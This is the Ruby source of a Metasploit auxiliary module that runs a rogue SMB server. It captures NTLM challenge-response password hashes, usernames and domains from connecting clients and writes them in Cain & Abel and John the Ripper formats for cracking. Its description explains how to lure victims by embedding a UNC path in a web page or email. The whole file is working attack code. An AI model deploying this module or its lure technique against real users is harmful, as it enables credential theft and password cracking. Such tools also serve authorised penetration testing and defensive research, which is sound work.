##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SMBServer

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Authentication Capture: SMB',
            'Description'    => %q{
              This module provides a SMB service that can be used to
              capture the challenge-response password hashes of SMB client
              systems. Responses sent by this service have by default the
              configurable challenge string (\x11\x22\x33\x44\x55\x66\x77\x88),
              allowing for easy cracking using Cain & Abel, L0phtcrack
              or John the ripper (with jumbo patch).

              To exploit this, the target system must try to authenticate
              to this module. The easiest way to force a SMB authentication attempt
              is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or
              email message. When the victim views the web page or email, their
              system will automatically connect to the server specified in the UNC
              share (the IP address of the system running this module) and attempt
              to authenticate.
            },
            'Author'      => 'hdm',
            'License'     => MSF_LICENSE,
            'Actions'     =>
                [
                    [ 'Sniffer' ]
                ],
            'PassiveActions' =>
                [
                    'Sniffer'
                ],
            'DefaultAction'  => 'Sniffer'
        )
    )

    register_options(
      [
        #OptString.new('LOGFILE',     [ false, "The local filename to store the captured hashes", nil ]),
        OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
        OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
      ], self.class )

    register_advanced_options(
      [
        OptBool.new("SMB_EXTENDED_SECURITY", [ true, "Use smb extended security negotiation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
        OptBool.new("NTLM_UseNTLM2_session", [ true, "Activate the 'negotiate NTLM2 key' flag in NTLM authentication. " +
          "When SMB extended security negotiate is set, client will use ntlm2_session instead of ntlmv1 (default on win 2K and above)", false ]),
        OptBool.new("USE_GSS_NEGOTIATION",   [ true, "Send a gss_security blob in smb_negotiate response when SMB extended security is set. " +
          "When this flag is not set, Windows will respond without gss encapsulation, Ubuntu will still use gss.", true ]),
        OptString.new('DOMAIN_NAME',         [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
      ], self.class)

  end

  def run
    @s_smb_esn = datastore['SMB_EXTENDED_SECURITY']
    @s_ntlm_esn = datastore['NTLM_UseNTLM2_session']
    @s_gss_neg = datastore['USE_GSS_NEGOTIATION']
    @domain_name = datastore['DOMAIN_NAME']

    @s_GUID = [Rex::Text.rand_text_hex(32)].pack('H*')
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
      @challenge = [ datastore['CHALLENGE'] ].pack("H*")
    else
      print_error("CHALLENGE syntax must match 1122334455667788")
      return
    end

    #those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
    @previous_lm_hash="none"
    @previous_ntlm_hash="none"
    exploit()
  end

  def smb_cmd_dispatch(cmd, c, buff)
    smb = @state[c]
    pkt = CONST::SMB_BASE_PKT.make_struct
    pkt.from_s(buff)
    #Record the IDs
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']

    case cmd
    when CONST::SMB_COM_NEGOTIATE
      #client set extended security negotiation
      if (pkt['Payload']['SMB'].v['Flags2'] & 0x800 != 0)
        smb_cmd_negotiate(c, buff, true)
      else
        smb_cmd_negotiate(c, buff, false)
      end
    when CONST::SMB_COM_SESSION_SETUP_ANDX

      wordcount = pkt['Payload']['SMB'].v['WordCount']

      #CIFS SMB_COM_SESSION_SETUP_ANDX request without smb extended security
      #This packet contains the lm/ntlm hashes
      if wordcount == 0x0D
        smb_cmd_session_setup(c, buff, false)
      #CIFS SMB_COM_SESSION_SETUP_ANDX request with smb extended security
      # can be of type NTLMSS_NEGOCIATE or NTLMSSP_AUTH,
      elsif wordcount == 0x0C
        smb_cmd_session_setup(c, buff, true)
      else
        print_status("SMB Capture - #{smb[:ip]} Unknown SMB_COM_SESSION_SETUP_ANDX request type , ignoring... ")
        smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS, @s_smb_esn)
      end


    when CONST::SMB_COM_TREE_CONNECT
      print_status("SMB Capture - Denying tree connect from #{smb[:name]} - #{smb[:ip]}")
      smb_error(cmd, c, SMB_SMB_STATUS_ACCESS_DENIED, @s_smb_esn)

    else
      print_status("SMB Capture - Ignoring request from #{smb[:name]} - #{smb[:ip]} (#{cmd})")
      smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS, @s_smb_esn)
    end
  end


  def smb_cmd_negotiate(c, buff, c_esn)
    smb = @state[c]
    pkt = CONST::SMB_NEG_PKT.make_struct
    pkt.from_s(buff)

    #Record the IDs
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']


    group    = ''
    machine  = smb[:nbsrc]

    dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)
    # print_status("Negotiation from #{smb[:name]}: #{dialects.join(", ")}")

    dialect =
      dialects.index("NT LM 0.12") ||
      dialects.length-1

    pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
    smb_set_defaults(c, pkt)

    time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
    pkt['Payload']['SMB'].v['Flags1'] = 0x88
    pkt['Payload']['SMB'].v['WordCount'] = 17
    pkt['Payload'].v['Dialect'] = dialect
    pkt['Payload'].v['SecurityMode'] = 3
    pkt['Payload'].v['MaxMPX'] = 2
    pkt['Payload'].v['MaxVCS'] = 1
    pkt['Payload'].v['MaxBuff'] = 4356
    pkt['Payload'].v['MaxRaw'] = 65536
    pkt['Payload'].v['SystemTimeLow'] = time_lo
    pkt['Payload'].v['SystemTimeHigh'] = time_hi
    pkt['Payload'].v['ServerTimeZone'] = 0x0
    pkt['Payload'].v['SessionKey'] = 0

    if c_esn && @s_smb_esn then
      pkt['Payload']['SMB'].v['Flags2'] = 0xc801
      pkt['Payload'].v['Capabilities'] = 0x8000e3fd
      pkt['Payload'].v['KeyLength'] = 0
      pkt['Payload'].v['Payload'] = @s_GUID

      if @s_gss_neg then
        pkt['Payload'].v['Payload'] += NTLM_UTILS::make_simple_negotiate_secblob_resp
      end

    else
      pkt['Payload']['SMB'].v['Flags2'] = 0xc001
      pkt['Payload'].v['Capabilities'] = 0xe3fd
      pkt['Payload'].v['KeyLength'] = 8
      pkt['Payload'].v['Payload'] = @challenge +
        Rex::Text.to_unicode(group) + "\x00\x00" +
        Rex::Text.to_unicode(machine) + "\x00\x00"
    end

    c.put(pkt.to_s)
  end

  def smb_cmd_session_setup(c, buff, esn)
    smb = @state[c]

    #extended security has been negotiated
    if esn
      pkt = CONST::SMB_SETUP_NTLMV2_PKT.make_struct
      pkt.from_s(buff)

      #Record the IDs
      smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
      smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
      smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
      smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
      securityblobLen = pkt['Payload'].v['SecurityBlobLen']
      blob = pkt['Payload'].v['Payload'][0,securityblobLen]

      #detect if GSS is being used
      if blob[0,7] == 'NTLMSSP'
        c_gss = false
      else
        c_gss = true
        start = blob.index('NTLMSSP')
        if start
          blob.slice!(0,start)
        else
          print_status("SMB Capture - Error finding NTLM in SMB_COM_SESSION_SETUP_ANDX request from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
          smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
          return
        end


      end
      ntlm_message = NTLM_MESSAGE::parse(blob)

      case ntlm_message
      when NTLM_MESSAGE::Type1
        #Send Session Setup AndX Response NTLMSSP_CHALLENGE response packet

        if (ntlm_message.flag & NTLM_CONST::NEGOTIATE_NTLM2_KEY != 0)
          c_ntlm_esn = true
        else
          c_ntlm_esn = false
        end
        pkt = CONST::SMB_SETUP_NTLMV2_RES_PKT.make_struct
        pkt.from_s(buff)
        smb_set_defaults(c, pkt)

        pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
        pkt['Payload']['SMB'].v['ErrorClass'] = CONST::SMB_STATUS_MORE_PROCESSING_REQUIRED
        pkt['Payload']['SMB'].v['Flags1'] = 0x88
        pkt['Payload']['SMB'].v['Flags2'] = 0xc807
        pkt['Payload']['SMB'].v['WordCount'] = 4
        pkt['Payload']['SMB'].v['UserID'] = 2050
        pkt['Payload'].v['AndX'] = 0xFF
        pkt['Payload'].v['Reserved1'] = 0x00
        pkt['Payload'].v['AndXOffset'] = 283 #ignored by client
        pkt['Payload'].v['Action'] = 0x0000

        win_domain = Rex::Text.to_unicode(@domain_name.upcase)
        win_name = Rex::Text.to_unicode(@domain_name.upcase)
        dns_domain = Rex::Text.to_unicode(@domain_name.downcase)
        dns_name = Rex::Text.to_unicode(@domain_name.downcase)

        #create the ntlmssp_challenge security blob
        if c_ntlm_esn && @s_ntlm_esn
          sb_flag = 0xe28a8215 # ntlm2
        else
          sb_flag = 0xe2828215 #no ntlm2
        end
        if c_gss
          securityblob = NTLM_UTILS::make_ntlmssp_secblob_chall( win_domain,
                      win_name,
                      dns_domain,
                      dns_name,
                      @challenge,
                      sb_flag)
        else
          securityblob = NTLM_UTILS::make_ntlmssp_blob_chall( 	win_domain,
                      win_name,
                      dns_domain,
                      dns_name,
                      @challenge,
                      sb_flag)
        end
        pkt['Payload'].v['SecurityBlobLen'] = securityblob.length
        pkt['Payload'].v['Payload'] = securityblob


        c.put(pkt.to_s)

      when NTLM_MESSAGE::Type3
        #we can process the hash and send a status_logon_failure response packet

        # Record the remote multiplex ID
        smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
        lm_len = ntlm_message.lm_response.length # Always 24
        nt_len = ntlm_message.ntlm_response.length

        if nt_len == 24 #lmv1/ntlmv1 or ntlm2_session
          arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
            :lm_hash => ntlm_message.lm_response.unpack('H*')[0],
            :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
          }

          if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
            arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
          end
        #if the length of the ntlm response is not 24 then it will be bigger and represent
        # a ntlmv2 response
        elsif nt_len > 24 #lmv2/ntlmv2
          arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
            :lm_hash 		=> ntlm_message.lm_response[0, 16].unpack('H*')[0],
            :lm_cli_challenge 	=> ntlm_message.lm_response[16, 8].unpack('H*')[0],
            :nt_hash 		=> ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
            :nt_cli_challenge 	=> ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
          }
        elsif nt_len == 0
          print_status("SMB Capture - Empty hash from #{smb[:name]} - #{smb[:ip]} captured, ignoring ... ")
          smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
          return
        else
          print_status("SMB Capture - Unknown hash type from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
          smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
          return
        end

        buff = pkt['Payload'].v['Payload']
        buff.slice!(0,securityblobLen)
        names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }

        smb[:username] = ntlm_message.user
        smb[:domain]   = ntlm_message.domain
        smb[:peer_os]   = names[0]
        smb[:peer_lm]   = names[1]

        begin
          smb_get_hash(smb,arg,true)
        rescue ::Exception => e
          print_error("SMB Capture - Error processing Hash from #{smb[:name]} - #{smb[:ip]} : #{e.class} #{e} #{e.backtrace}")
        end

        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)

      else
        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
      end

    #if not we can get the hash and send a status_access_denied response packet
    else

      pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
      pkt.from_s(buff)

      # Record the  IDs
      smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
      smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
      smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
      smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']

      lm_len = pkt['Payload'].v['PasswordLenLM'] # Always 24
      nt_len = pkt['Payload'].v['PasswordLenNT']


      if nt_len == 24
        arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
          :lm_hash => pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0],
          :nt_hash => pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
        }
      #if the length of the ntlm response is not 24 then it will be bigger and represent
      # a ntlmv2 response
      elsif nt_len > 24
        arg = {	:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
          :lm_hash => pkt['Payload'].v['Payload'][0, 16].unpack("H*")[0],
          :lm_cli_challenge => pkt['Payload'].v['Payload'][16, 8].unpack("H*")[0],
          :nt_hash => pkt['Payload'].v['Payload'][lm_len, 16].unpack("H*")[0],
          :nt_cli_challenge => pkt['Payload'].v['Payload'][lm_len + 16, nt_len - 16].unpack("H*")[0]
        }
      elsif nt_len == 0
        print_status("SMB Capture - Empty hash captured from #{smb[:name]} - #{smb[:ip]} captured, ignoring ... ")
        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
        return
      else
        print_status("SMB Capture - Unknown hash type capture from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
        return
      end

      buff = pkt['Payload'].v['Payload']
      buff.slice!(0, lm_len + nt_len)
      names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }

      smb[:username] = names[0]
      smb[:domain]   = names[1]
      smb[:peer_os]   = names[2]
      smb[:peer_lm]   = names[3]

      begin
        smb_get_hash(smb,arg,false)

      rescue ::Exception => e
        print_error("SMB Capture - Error processing Hash from #{smb[:name]} : #{e.class} #{e} #{e.backtrace}")
      end

      smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)

    end
  end

  def smb_get_hash(smb, arg = {}, esn=true)

    ntlm_ver = arg[:ntlm_ver]
    if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
      lm_hash = arg[:lm_hash]
      nt_hash = arg[:nt_hash]
    else
      lm_hash = arg[:lm_hash]
      nt_hash = arg[:nt_hash]
      lm_cli_challenge = arg[:lm_cli_challenge]
      nt_cli_challenge = arg[:nt_cli_challenge]
    end

    # Clean up the data for logging
    if (smb[:username] == "")
      smb[:username] = nil
    end

    if (smb[:domain] == "")
      smb[:domain] = nil
    end

    unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then

      @previous_lm_hash = lm_hash
      @previous_ntlm_hash = nt_hash

      # Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
      case ntlm_ver
      when NTLM_CONST::NTLM_V1_RESPONSE
        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
                :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
          print_status("SMB Capture - NLMv1 Hash correspond to an empty password, ignoring ... #{smb[:ip]}")
          return
        end
        if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
          lm_hash_message = "Disabled"
        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
                :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
          lm_hash_message = "Disabled (from empty password)"
        else
          lm_hash_message = lm_hash
          lm_chall_message = lm_cli_challenge
        end
      when NTLM_CONST::NTLM_V2_RESPONSE
        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
                :cli_challenge => [nt_cli_challenge].pack("H*"),
                :user => Rex::Text::to_ascii(smb[:username]),
                :domain => Rex::Text::to_ascii(smb[:domain]),
                :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
          print_status("SMB Capture - NTLMv2 Hash correspond to an empty password, ignoring ... #{smb[:ip]}")
          return
        end
        if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
          lm_hash_message = "Disabled"
          lm_chall_message = 'Disabled'
        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
                :cli_challenge => [lm_cli_challenge].pack("H*"),
                :user => Rex::Text::to_ascii(smb[:username]),
                :domain => Rex::Text::to_ascii(smb[:domain]),
                :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
          lm_hash_message = "Disabled (from empty password)"
          lm_chall_message = 'Disabled'
        else
          lm_hash_message = lm_hash
          lm_chall_message = lm_cli_challenge
        end

      when NTLM_CONST::NTLM_2_SESSION_RESPONSE
        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
                :cli_challenge => [lm_hash].pack("H*")[0,8],
                :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
          print_status("SMB Capture - NTLM2_session Hash correspond to an empty password, ignoring ... #{smb[:ip]}")
          return
        end
        lm_hash_message = lm_hash
        lm_chall_message = lm_cli_challenge
      end


      # Display messages
      if esn
        smb[:username] = Rex::Text::to_ascii(smb[:username])
        smb[:domain]   = Rex::Text::to_ascii(smb[:domain]) if smb[:domain]
      end

      capturedtime = Time.now.to_s
      case ntlm_ver
      when NTLM_CONST::NTLM_V1_RESPONSE
        smb_db_type_hash = "smb_netv1_hash"
        capturelogmessage =
          "SMB Captured - #{capturedtime}\nNTLMv1 Response Captured from #{smb[:name]} - #{smb[:ip]} \n" +
          "USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
          "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
      when NTLM_CONST::NTLM_V2_RESPONSE
        smb_db_type_hash = "smb_netv2_hash"
        capturelogmessage =
          "SMB Captured - #{capturedtime}\nNTLMv2 Response Captured from #{smb[:name]} - #{smb[:ip]} \n" +
          "USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
          "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
          "LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
          "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
          "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
      when NTLM_CONST::NTLM_2_SESSION_RESPONSE
        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
        smb_db_type_hash = "smb_netv1_hash"
        capturelogmessage =
          "SMB Captured - #{capturedtime}\nNTLM2_SESSION Response Captured from #{smb[:name]} - #{smb[:ip]} \n" +
          "USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
          "NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
          "NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"

      else # should not happen
        return
      end

      print_status(capturelogmessage)
      lm_text = (lm_hash + lm_cli_challenge.to_s).empty? ? "00" * 24 : lm_hash + lm_cli_challenge.to_s
      nt_text = (nt_hash + nt_cli_challenge.to_s).empty? ? "00" * 24 : nt_hash + nt_cli_challenge.to_s
      pass = "#{smb[:domain]}:#{lm_text}:#{nt_text}:#{datastore['CHALLENGE'].to_s}"

      # DB reporting
      report_auth_info(
        :host  => smb[:ip],
        :port => datastore['SRVPORT'],
        :sname => 'smb_challenge',
        :user => smb[:username],
        :pass => pass,
        :type => smb_db_type_hash,
        :proof => "NAME=#{smb[:nbsrc]} DOMAIN=#{smb[:domain]} OS=#{smb[:peer_os]}",
        :source_type => "captured",
        :active => true
      )

      report_note(
        :host  => smb[:ip],
        :type  => "smb_peer_os",
        :data  => smb[:peer_os]
      ) if (smb[:peer_os] and smb[:peer_os].strip.length > 0)

      report_note(
        :host  => smb[:ip],
        :type  => "smb_peer_lm",
        :data  => smb[:peer_lm]
      ) if (smb[:peer_lm] and smb[:peer_lm].strip.length > 0)

      report_note(
        :host  => smb[:ip],
        :type  => "smb_domain",
        :data  => smb[:domain]
      ) if (smb[:domain] and smb[:domain].strip.length > 0)


      #if(datastore['LOGFILE'])
      #	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
      #end

      if(datastore['CAINPWFILE'] and smb[:username])
        if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
          fd = File.open(datastore['CAINPWFILE'], "ab")
          fd.puts(
            [
              smb[:username],
              smb[:domain] ? smb[:domain] : "NULL",
              @challenge.unpack("H*")[0],
              lm_hash.empty? ? "0" * 48 : lm_hash,
              nt_hash.empty? ? "0" * 48 : nt_hash
            ].join(":").gsub(/\n/, "\\n")
          )
          fd.close
        end
      end

      if(datastore['JOHNPWFILE'] and smb[:username])
        case ntlm_ver
        when NTLM_CONST::NTLM_V1_RESPONSE,NTLM_CONST::NTLM_2_SESSION_RESPONSE

          fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', "ab")
          fd.puts(
            [
              smb[:username],"",
              smb[:domain] ? smb[:domain] : "NULL",
              lm_hash.empty? ? "0" * 48 : lm_hash,
              nt_hash.empty? ? "0" * 48 : nt_hash,
              @challenge.unpack("H*")[0]
            ].join(":").gsub(/\n/, "\\n")
          )
          fd.close
        when NTLM_CONST::NTLM_V2_RESPONSE
          #lmv2
          fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', "ab")
          fd.puts(
            [
              smb[:username],"",
              smb[:domain] ? smb[:domain] : "NULL",
              @challenge.unpack("H*")[0],
              lm_hash.empty? ? "0" * 32 : lm_hash,
              lm_cli_challenge.empty? ? "0" * 16 : lm_cli_challenge
            ].join(":").gsub(/\n/, "\\n")
          )
          fd.close
          #ntlmv2
          fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , "ab")
          fd.puts(
            [
              smb[:username],"",
              smb[:domain] ? smb[:domain] : "NULL",
              @challenge.unpack("H*")[0],
              nt_hash.empty? ? "0" * 32 : nt_hash,
              nt_cli_challenge.empty? ? "0" * 160 : nt_cli_challenge
            ].join(":").gsub(/\n/, "\\n")
          )
          fd.close
        end

      end
    end
  end

  def smb_cmd_close(c, buff)
  end

  def smb_cmd_create(c, buff)
  end

  def smb_cmd_delete(c, buff)
  end

  def smb_cmd_nttrans(c, buff)
  end

  def smb_cmd_open(c, buff)
  end

  def smb_cmd_read(c, buff)
  end

  def smb_cmd_trans(c, buff)
  end

  def smb_cmd_tree_connect(c, buff)
  end

  def smb_cmd_tree_disconnect(c, buff)
  end

  def smb_cmd_write(c, buff)
  end

end
